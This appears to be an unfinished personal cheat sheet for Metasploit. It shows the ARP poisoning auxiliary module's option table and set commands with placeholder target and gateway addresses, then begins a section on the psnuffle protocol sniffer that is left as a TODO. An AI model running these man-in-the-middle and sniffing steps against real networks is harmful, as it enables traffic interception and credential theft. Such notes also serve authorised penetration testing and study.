# Metasploit

## 01 - ARP Poisoning and PSnuffle

- Auxiliary module for ARP poisoning

```
msf > use auxiliary/spoof/arp/arp_poisoning

msf auxiliary(spoof/arp/arp_poisoning) > options

Module options (auxiliary/spoof/arp/arp_poisoning):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   AUTO_ADD       false            yes       Auto add new host when discovered by the listener
   BIDIRECTIONAL  false            yes       Spoof also the source with the dest
   DHOSTS                          yes       Target ip addresses
   INTERFACE                       no        The name of the interface
   LISTENER       true             yes       Use an additional thread that will listen for arp requests to reply as fast as possible
   SHOSTS                          yes       Spoofed ip addresses
   SMAC                            no        The spoofed mac


View the full module info with the info, or info -d command.

msf auxiliary(spoof/arp/arp_poisoning) > set auto_add <true | false>

msf auxiliary(spoof/arp/arp_poisoning) > set bidirectional <true | false>

msf auxiliary(spoof/arp/arp_poisoning) > set listener <true | false>

msf auxiliary(spoof/arp/arp_poisoning) > set dhosts <target_IP>

msf auxiliary(spoof/arp/arp_poisoning) > set interface <interface>

msf auxiliary(spoof/arp/arp_poisoning) > set shosts <gateway_IP>

msf auxiliary(spoof/arp/arp_poisoning) > set smac <spoofed_MAC_Address>
```

- Auxiliary module for sniffing network protocols

TODO: Fill this info

```
msf > use auxiliary/sniffer/psnuffle

msf auxiliary(sniffer/psnuffle) > options
```